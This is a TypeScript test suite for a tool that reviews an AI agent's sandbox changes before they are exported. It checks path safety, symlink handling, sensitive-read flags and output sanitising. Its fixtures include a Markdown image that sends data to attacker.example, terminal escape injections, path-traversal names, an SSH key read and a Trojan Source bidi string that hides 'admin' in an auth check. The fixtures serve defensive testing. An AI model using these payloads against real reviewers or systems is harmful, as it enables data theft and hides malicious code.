import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, relative } from "node:path";
import { test } from "node:test";
import { MAX_ENTRIES, collectChanges, exportChanges, makeActivity, safePath, toMarkdown, toTerminal, unified, type Change, type Packet } from "../review.ts";
import { FakeSandbox, entry } from "./fakes.ts";

const collect = async (original: Record<string, string>, sb: FakeSandbox, maxBytes?: number) =>
  collectChanges(original, await sb.files.list(".", { recursive: true, maxCount: MAX_ENTRIES }), sb.files.read, maxBytes);
const change = (path: string, status: Change["status"], old: string | null, neu: string | null, note = ""): Change => ({ path, status, old, new: neu, note });
const tmp = () => mkdtempSync(join(tmpdir(), "gate-"));

test("changes cover modified, added and deleted files, and skip unchanged ones", async () => {
  const sb = new FakeSandbox();
  sb.fs.set("a.py", "x = 2\n"); sb.fs.set("new.py", "y = 1\n"); sb.fs.set("same.py", "s\n");
  const changes = await collect({ "a.py": "x = 1\n", "gone.py": "g\n", "same.py": "s\n" }, sb);
  assert.deepEqual(changes.map((c) => [c.path, c.status]), [["a.py", "modified"], ["gone.py", "deleted"], ["new.py", "added"]]);
});

test("caches are ignored", async () => {
  const sb = new FakeSandbox();
  sb.fs.set("pkg/__pycache__/m.cpython-312.pyc", new Uint8Array([0, 1])); sb.fs.set(".pytest_cache/v/x", "1"); sb.fs.set("m.pyc", new Uint8Array([0]));
  assert.deepEqual(await collect({}, sb), []);
});

test("symlinks, binaries and large files are listed but never exportable", async () => {
  const sb = new FakeSandbox();
  sb.fs.set("big.txt", "x".repeat(11)); sb.fs.set("blob.bin", new Uint8Array([0xff, 0xfe, 0x00]));
  sb.links.set("a.py", "/etc/passwd"); // replaces an original file: skipped, not reported as deleted
  const changes = await collect({ "a.py": "x\n" }, sb, 10);
  assert.deepEqual(changes.map((c) => [c.path, c.status]), [["a.py", "skipped"], ["big.txt", "skipped"], ["blob.bin", "skipped"]]);
  assert.match(changes[0].note, /symlink/); assert.match(changes[0].note, /\/etc\/passwd/);
  assert.match(changes[1].note, /large/); assert.match(changes[2].note, /binary/);
});

for (const path of ["/etc/passwd", "../x", "a/../../x", "a//b", "", "a\x1b[2Jb", "C:\\x", "a\\b"]) {
  test(`unsafe path is rejected: ${JSON.stringify(path)}`, () => assert.equal(safePath(path), false));
}
for (const path of ["a.py", "pkg/mod.py", ".env", "tests/test_x.py"]) {
  test(`ordinary path is safe: ${path}`, () => assert.equal(safePath(path), true));
}

test("an unsafe sandbox path is skipped without being read", async () => {
  const reads: string[] = [];
  const changes = await collectChanges({}, [entry("../escape.py", "file", 3)], async (p) => { reads.push(p); return new TextEncoder().encode("bad"); });
  assert.deepEqual(changes.map((c) => [c.status, c.note]), [["skipped", "unsafe path"]]);
  assert.deepEqual(reads, []);
});

test("the unified diff is git-style for each status", () => {
  assert.deepEqual(unified(change("a.py", "modified", "x = 1\n", "x = 2\n")).split("\n").slice(0, 2), ["--- a/a.py", "+++ b/a.py"]);
  assert.deepEqual(unified(change("n.py", "added", null, "y\n")).split("\n").slice(0, 2), ["--- /dev/null", "+++ b/n.py"]);
  assert.deepEqual(unified(change("g.py", "deleted", "g\n", null)).split("\n").slice(0, 2), ["--- a/g.py", "+++ /dev/null"]);
  assert.equal(unified(change("s", "skipped", null, null, "symlink")), "");
});

test("the unified diff marks a missing final newline", () => {
  assert.ok(unified(change("a.py", "modified", "x\n", "x\ny")).endsWith("+y\n\\ No newline at end of file\n"));
});

test("activity keeps only records after the setup boundary, and flags sensitive reads and deletes", () => {
  const sb = new FakeSandbox();
  sb.record("fs.write", { target: ".env" }); // the script's setup upload
  const boundary = sb.trail.at(-1)!.at;
  sb.record("fs.read", { target: ".env" });
  sb.record("fs.read", { target: "home/.ssh/id_ed25519" });
  sb.record("exec", { command: "rm" });
  sb.record("exec");
  sb.record("fs.write", { target: "signup.py" });
  const rows = makeActivity([...sb.trail].reverse(), boundary);
  assert.deepEqual(rows.map((r) => r.group), ["fs.read", "fs.read", "exec rm", "exec (program not recorded)", "fs.write"]);
  assert.deepEqual(rows.map((r) => r.flag), ["sensitive read", "sensitive read", "delete", null, null]);
  assert.equal(rows[0].offsetS, 0); assert.equal(rows.at(-1)!.offsetS, 4);
});

test("activity masks the credential and strips control characters", () => {
  const sb = new FakeSandbox();
  sb.record("fs.read", { target: "x\x1b]0;pwned\x07.py" });
  const row = makeActivity(sb.trail, null)[0];
  assert.equal(row.credential, "c0de0001");
  assert.ok(!row.target.includes("\x1b") && !row.target.includes("\x07"));
});

function packet(over: Partial<Packet> = {}): Packet {
  const sb = new FakeSandbox();
  sb.record("fs.read", { target: ".env" }); sb.record("fs.write", { target: "signup.py" });
  return { sandbox: "review-gate-1", model: "m", task: "add validation", summary: "Added checks.",
    changes: [change("signup.py", "modified", "a\n", "b\n"), change("link", "skipped", null, null, "symlink")],
    activity: makeActivity(sb.trail, null), agentCalls: 2, retentionDays: 30, ...over };
}

test("the terminal packet shows the diff, activity, flags and the gap", () => {
  const out = toTerminal(packet());
  assert.ok(out.includes("-a\n+b") && out.includes("signup.py"));
  assert.ok(out.includes("sensitive read") && out.includes("fs.read"));
  assert.ok(out.includes("link") && out.includes("not exported"));
  assert.ok(out.includes("program")); // what the trail does not record
});

test("the terminal packet warns when the trail is missing calls", () => {
  assert.ok(toTerminal(packet({ activity: packet().activity.slice(0, 1), agentCalls: 3 })).includes("1 of the agent's 3 calls"));
});

test("packet text from the sandbox cannot inject terminal escapes", () => {
  const out = toTerminal(packet({ summary: "ok\x1b[2J", changes: [change("a.py", "modified", "a\n", "b\x1b]52;c;x\x07\n")] }));
  assert.ok(!out.includes("\x1b") && !out.includes("\x07"));
});

test("the Markdown fence is longer than any backtick run in the diff", () => {
  const md = toMarkdown(packet({ changes: [change("README.md", "modified", "a\n", "```python\nx\n```\n")] }));
  assert.ok(md.includes("\n````diff\n") && md.includes("\n````\n"));
  assert.ok(md.includes("# Review packet") && md.includes("| `fs.read` |"));
});

test("export writes only added and modified files inside the folder", () => {
  const out = join(tmp(), "approved", "run");
  const written = exportChanges([change("pkg/a.py", "modified", "x\n", "y\n"), change("new.py", "added", null, "n\n"),
    change("gone.py", "deleted", "g\n", null), change("link", "skipped", null, null, "symlink")], out);
  assert.deepEqual(written.map((p) => relative(out, p)).sort(), ["new.py", join("pkg", "a.py")]);
  assert.equal(readFileSync(join(out, "pkg", "a.py"), "utf8"), "y\n");
  assert.ok(!existsSync(join(out, "gone.py")));
});

test("export refuses any path outside the folder before writing anything", () => {
  const base = tmp(); const out = join(base, "approved");
  assert.throws(() => exportChanges([change("ok.py", "added", null, "x\n"), change("../evil.py", "added", null, "x\n")], out), /unsafe path/);
  assert.ok(!existsSync(out) && !existsSync(join(base, "evil.py")));
});

test("export refuses an existing folder", () => {
  assert.throws(() => exportChanges([change("a.py", "added", null, "x\n")], tmp()), /exists/);
});

test("Markdown from the sandbox or the model is inert", () => {
  const image = "![](https://attacker.example/p?k=v)";
  const md = toMarkdown(packet({ summary: `Done. ${image}`, task: "<img src=x>", changes: [change(`${image}.py`, "added", null, "x\n")] }));
  const prose = md.replace(/^(`{3,})\w*\n[\s\S]*?^\1$/gm, "").replace(/`+[^`]*`+/g, ""); // drop fences, then code spans
  assert.ok(!prose.includes("![") && !prose.includes("<img") && !prose.includes("]("));
});

test("hidden Unicode is masked and the file is called out", () => {
  const trojan = 'access = "user\u202e \u2066// admin\u2069 \u2066"\n';
  const p = packet({ changes: [change("auth.py", "added", null, trojan)] });
  const out = toTerminal(p); const md = toMarkdown(p);
  assert.ok(!["\u202e", "\u2066", "\u2069"].some((ch) => (out + md).includes(ch)));
  assert.ok(out.includes("hidden characters") && md.includes("hidden characters"));
});

test("a file that grew after listing is skipped by its real size", async () => {
  const changes = await collectChanges({}, [entry("big.py", "file", 1)], async () => new TextEncoder().encode("x".repeat(11)), 10);
  assert.deepEqual(changes.map((c) => [c.status, c.note]), [["skipped", "too large to review (11 bytes)"]]);
});
